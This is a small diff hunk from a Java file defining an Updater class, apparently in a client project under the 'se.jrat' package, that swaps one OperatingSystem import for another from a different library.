@@ -5,7 +5,8 @@ import java.io.File;
 import javax.swing.JOptionPane;
 
 import se.jrat.client.utils.Utils;
-import se.jrat.common.OperatingSystem;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 public class Updater {
 
